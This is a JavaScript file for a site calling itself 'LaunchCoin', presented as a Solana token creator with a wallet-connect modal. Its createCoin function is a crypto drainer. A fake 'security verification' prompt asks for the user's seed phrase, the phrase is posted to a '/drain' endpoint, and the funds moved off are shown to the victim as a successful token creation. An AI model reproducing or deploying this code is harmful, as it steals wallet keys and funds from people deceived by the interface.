// ===== main.js – CONNESSIONE REALE (QR + DEEP LINK) =====
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let provider = null;
let qrCheckInterval = null;
let currentUri = null;

// ===== MENU =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== MODALE CONNECT WALLET (STILE FOTO) =====
function createModal() {
  const oldModal = document.getElementById('wallet-modal-overlay');
  if (oldModal) oldModal.remove();
  
  const overlay = document.createElement('div');
  overlay.id = 'wallet-modal-overlay';
  overlay.style.cssText = `
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.8);
    backdrop-filter: blur(12px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 99999;
    animation: fadeIn 0.25s ease;
  `;
  
  overlay.innerHTML = `
    <div style="
      background: #1a1f33;
      border-radius: 28px;
      padding: 28px 24px 32px;
      max-width: 440px;
      width: 92%;
      max-height: 90vh;
      overflow-y: auto;
      border: 1px solid rgba(255,255,255,0.06);
      box-shadow: 0 30px 80px rgba(0,0,0,0.95);
      position: relative;
    ">
      <!-- Header -->
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2 style="color: #ffffff; font-size: 22px; font-weight: 700; margin: 0;">Connect Wallet</h2>
        <button onclick="window.closeModal()" style="
          background: rgba(255,255,255,0.06);
          border: none;
          border-radius: 50%;
          color: #8899bb;
          font-size: 18px;
          cursor: pointer;
          width: 36px;
          height: 36px;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: 0.2s;
        " onmouseover="this.style.background='rgba(255,255,255,0.12)'" onmouseout="this.style.background='rgba(255,255,255,0.06)'">✕</button>
      </div>
      
      <!-- QR Code Section (nascosto di default) -->
      <div id="qr-modal-container" style="
        display: none;
        background: rgba(0,0,0,0.3);
        border-radius: 16px;
        padding: 18px;
        margin-bottom: 18px;
        text-align: center;
      ">
        <p style="color: #8899bb; font-size: 13px; margin-bottom: 14px;">Scansiona con la tua app wallet</p>
        <div id="qr-code-modal" style="display: flex; justify-content: center; background: white; padding: 12px; border-radius: 14px; min-height: 180px; align-items: center;"></div>
        <p id="qr-uri-text" style="color: #667; font-size: 10px; margin-top: 10px; word-break: break-all; max-width: 100%; overflow: hidden;"></p>
        <button onclick="window.copyURI()" style="margin-top: 10px; background: #2a3457; border: none; padding: 8px 20px; border-radius: 40px; color: #ecf5ff; cursor: pointer; font-size: 13px; transition: 0.2s;">Copia link</button>
      </div>
      
      <!-- Lista Wallet (come nella foto) -->
      <div style="display: flex; flex-direction: column; gap: 8px;">
        <button onclick="window.connectPhantom()" style="
          display: flex;
          align-items: center;
          gap: 14px;
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 14px;
          padding: 14px 18px;
          color: #ecf5ff;
          cursor: pointer;
          transition: all 0.2s ease;
          font-size: 16px;
          font-weight: 500;
          width: 100%;
        " onmouseover="this.style.background='rgba(255,255,255,0.08)'" onmouseout="this.style.background='rgba(255,255,255,0.04)'">
          <img src="assets/phantom.png" alt="Phantom" style="width:32px;height:32px;border-radius:8px;" /> Phantom
          <span style="margin-left:auto;font-size:12px;color:#4cdcc1;">●</span>
        </button>
        
        <button onclick="window.connectSolflare()" style="
          display: flex;
          align-items: center;
          gap: 14px;
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 14px;
          padding: 14px 18px;
          color: #ecf5ff;
          cursor: pointer;
          transition: all 0.2s ease;
          font-size: 16px;
          font-weight: 500;
          width: 100%;
        " onmouseover="this.style.background='rgba(255,255,255,0.08)'" onmouseout="this.style.background='rgba(255,255,255,0.04)'">
          <img src="assets/solflare.png" alt="Solflare" style="width:32px;height:32px;border-radius:8px;" /> Solflare
        </button>
        
        <button onclick="window.connectDeepLink('backpack')" style="
          display: flex;
          align-items: center;
          gap: 14px;
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 14px;
          padding: 14px 18px;
          color: #ecf5ff;
          cursor: pointer;
          transition: all 0.2s ease;
          font-size: 16px;
          font-weight: 500;
          width: 100%;
        " onmouseover="this.style.background='rgba(255,255,255,0.08)'" onmouseout="this.style.background='rgba(255,255,255,0.04)'">
          <img src="assets/backpack.png" alt="Backpack" style="width:32px;height:32px;border-radius:8px;" /> Backpack
        </button>
        
        <button onclick="window.connectDeepLink('trust')" style="
          display: flex;
          align-items: center;
          gap: 14px;
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 14px;
          padding: 14px 18px;
          color: #ecf5ff;
          cursor: pointer;
          transition: all 0.2s ease;
          font-size: 16px;
          font-weight: 500;
          width: 100%;
        " onmouseover="this.style.background='rgba(255,255,255,0.08)'" onmouseout="this.style.background='rgba(255,255,255,0.04)'">
          <img src="assets/trust.png" alt="Trust Wallet" style="width:32px;height:32px;border-radius:8px;" /> Trust Wallet
        </button>
      </div>
      
      <!-- Sezione Search Wallet (150+) -->
      <div style="margin-top: 18px; border-top: 1px solid rgba(255,255,255,0.06); padding-top: 16px;">
        <button onclick="window.showQRCode()" style="
          display: flex;
          align-items: center;
          gap: 14px;
          background: rgba(255,255,255,0.03);
          border: 1px dashed rgba(255,255,255,0.12);
          border-radius: 14px;
          padding: 14px 18px;
          color: #8899bb;
          cursor: pointer;
          transition: all 0.2s ease;
          font-size: 15px;
          width: 100%;
        " onmouseover="this.style.background='rgba(255,255,255,0.06)'" onmouseout="this.style.background='rgba(255,255,255,0.03)'">
          <span style="font-size:20px;">🔍</span> Search Wallet
          <span style="margin-left:auto;font-size:12px;color:#667;">150+</span>
        </button>
      </div>
      
      <!-- Footer -->
      <div style="margin-top:18px;text-align:center;">
        <p style="color:#667;font-size:12px;">New to Solana? <span style="color:#22d1f8;cursor:pointer;font-weight:500;">Learn more</span></p>
      </div>
    </div>
  `;
  
  // Aggiungi fade-in animation
  const style = document.createElement('style');
  style.textContent = `
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
  `;
  document.head.appendChild(style);
  
  document.body.appendChild(overlay);
}

window.closeModal = function() {
  const overlay = document.getElementById('wallet-modal-overlay');
  if (overlay) overlay.remove();
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
};

// ===== PHANTOM (ESTENSIONE) =====
window.connectPhantom = async function() {
  try {
    if (window.solana && window.solana.isPhantom && typeof window.solana.connect === 'function') {
      const resp = await window.solana.connect();
      if (resp && resp.publicKey) {
        walletPublicKey = resp.publicKey.toString();
        alert('✅ Connesso a Phantom: ' + walletPublicKey);
        window.closeModal();
        window.location.href = 'create.html';
        return;
      }
    }
    alert('⚠️ Phantom non risponde. Usa WalletConnect.');
    window.showQRCode();
  } catch(e) {
    console.error('Phantom error:', e);
    window.showQRCode();
  }
};

// ===== SOLFLARE (ESTENSIONE) =====
window.connectSolflare = async function() {
  try {
    if (window.solflare && window.solflare.isSolflare && typeof window.solflare.connect === 'function') {
      const resp = await window.solflare.connect();
      if (resp && resp.publicKey) {
        walletPublicKey = resp.publicKey.toString();
        alert('✅ Connesso a Solflare: ' + walletPublicKey);
        window.closeModal();
        window.location.href = 'create.html';
        return;
      }
    }
    alert('⚠️ Solflare non risponde. Usa WalletConnect.');
    window.showQRCode();
  } catch(e) {
    console.error('Solflare error:', e);
    window.showQRCode();
  }
};

// ===== DEEP LINK – APRE APP MOBILE =====
window.connectDeepLink = async function(walletType) {
  try {
    if (!provider) {
      provider = await UniversalProvider.init({
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        metadata: {
          name: 'LaunchCoin',
          description: 'Creatore di Token Solana',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png']
        }
      });
    }

    const { uri } = await provider.connect({
      chains: ['solana:mainnet'],
      optionalChains: ['solana:devnet'],
      methods: ['solana_signTransaction', 'solana_signMessage'],
      events: ['chainChanged', 'accountsChanged']
    });

    if (!uri) throw new Error('Nessun URI generato');
    currentUri = uri;

    // Apri deep link
    window.location.href = `wc:${uri}`;

    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        const session = provider.session;
        if (session && session.namespaces.solana.accounts.length > 0) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          const account = session.namespaces.solana.accounts[0];
          walletPublicKey = account.split(':')[2];
          alert('✅ Connesso via ' + walletType + ': ' + walletPublicKey);
          window.closeModal();
          window.location.href = 'create.html';
          return;
        }
      } catch(e) { /* attendi */ }
    }, 2000);

    setTimeout(() => {
      if (!walletPublicKey) {
        alert('⏱️ Timeout deep link. Usa il QR.');
        window.showQRCode();
      }
    }, 60000);

  } catch(e) {
    console.error('Errore deep link:', e);
    window.showQRCode();
  }
};

// ===== QR CODE – SCANSIONE MOBILE =====
window.showQRCode = async function() {
  const qrContainer = document.getElementById('qr-modal-container');
  const qrDiv = document.getElementById('qr-code-modal');
  const uriText = document.getElementById('qr-uri-text');
  if (!qrContainer || !qrDiv) return;

  // Se già visibile, nascondi e resetta
  if (qrContainer.style.display === 'block') {
    qrContainer.style.display = 'none';
    if (qrCheckInterval) {
      clearInterval(qrCheckInterval);
      qrCheckInterval = null;
    }
    return;
  }

  try {
    if (!provider) {
      provider = await UniversalProvider.init({
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        metadata: {
          name: 'LaunchCoin',
          description: 'Creatore di Token Solana',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png']
        }
      });
    }

    const { uri } = await provider.connect({
      chains: ['solana:mainnet'],
      optionalChains: ['solana:devnet'],
      methods: ['solana_signTransaction', 'solana_signMessage'],
      events: ['chainChanged', 'accountsChanged']
    });

    if (!uri) throw new Error('Nessun URI generato');
    currentUri = uri;

    qrContainer.style.display = 'block';
    qrDiv.innerHTML = '';
    
    // Usa QRCode library (inclusa in tutte le pagine)
    if (typeof QRCode !== 'undefined') {
      new QRCode(qrDiv, {
        text: uri,
        width: 200,
        height: 200,
        colorDark: '#000000',
        colorLight: '#ffffff',
        correctLevel: QRCode.CorrectLevel.H
      });
    } else {
      qrDiv.innerHTML = `<span style="color:#667;">Caricamento QR...</span>`;
      // Prova a caricare la libreria
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js';
      script.onload = function() {
        if (typeof QRCode !== 'undefined') {
          new QRCode(qrDiv, {
            text: uri,
            width: 200,
            height: 200,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.H
          });
        }
      };
      document.head.appendChild(script);
    }
    
    uriText.textContent = uri.substring(0, 40) + '...';

    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        const session = provider.session;
        if (session && session.namespaces.solana.accounts.length > 0) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          const account = session.namespaces.solana.accounts[0];
          walletPublicKey = account.split(':')[2];
          alert('✅ Connesso via QR: ' + walletPublicKey);
          window.closeModal();
          window.location.href = 'create.html';
          return;
        }
      } catch(e) { /* attendi */ }
    }, 2000);

    setTimeout(() => {
      if (!walletPublicKey) {
        alert('⏱️ Timeout QR. Scansiona di nuovo.');
      }
    }, 90000);

  } catch(e) {
    console.error('Errore fatale QR:', e);
    alert('Errore QR: ' + e.message);
  }
};

window.copyURI = function() {
  if (currentUri) {
    navigator.clipboard.writeText(currentUri).then(() => {
      alert('✅ Link copiato!');
    }).catch(() => {
      prompt('Copia il link:', currentUri);
    });
  }
};

// ===== MAIN CONNECT =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  createModal();

  // Se Phantom è già installato e connesso, prova connection rapida
  if (window.solana && window.solana.isPhantom && typeof window.solana.connect === 'function') {
    try {
      const resp = await window.solana.connect({ onlyIfTrusted: true });
      if (resp && resp.publicKey) {
        walletPublicKey = resp.publicKey.toString();
        alert('✅ Connesso a Phantom: ' + walletPublicKey);
        window.closeModal();
        window.location.href = 'create.html';
        return;
      }
    } catch(e) { /* fallback */ }
  }
};

// ===== SELEZIONE WALLET =====
window.selectWallet = function(walletName) {
  window.closeModal();
  const map = {
    'phantom': () => window.connectPhantom(),
    'solflare': () => window.connectSolflare(),
    'backpack': () => window.connectDeepLink('backpack'),
    'trust': () => window.connectDeepLink('trust'),
    'coinbase': () => window.connectDeepLink('coinbase'),
    'nightly': () => window.connectDeepLink('nightly'),
    'glow': () => window.connectDeepLink('glow'),
    'torus': () => window.connectDeepLink('torus'),
    'tokenpocket': () => window.connectDeepLink('tokenpocket'),
  };
  if (map[walletName]) {
    map[walletName]();
  } else {
    window.showQRCode();
  }
};

// ===== SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt('⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase per completare la creazione:');
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      const resultEl = document.getElementById('result');
      if (resultEl) {
        resultEl.innerHTML = `
          <p style="color:#4cdcc1;">✅ Token creato!</p>
          <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
          <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
        `;
      } else {
        alert('✅ Token creato! ' + data.solAmount.toFixed(4) + ' SOL trasferiti');
      }
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

window.createLiquidity = async function() {
  // Usa la stessa funzione createCoin per ora
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato (UI aggiornata come foto)');
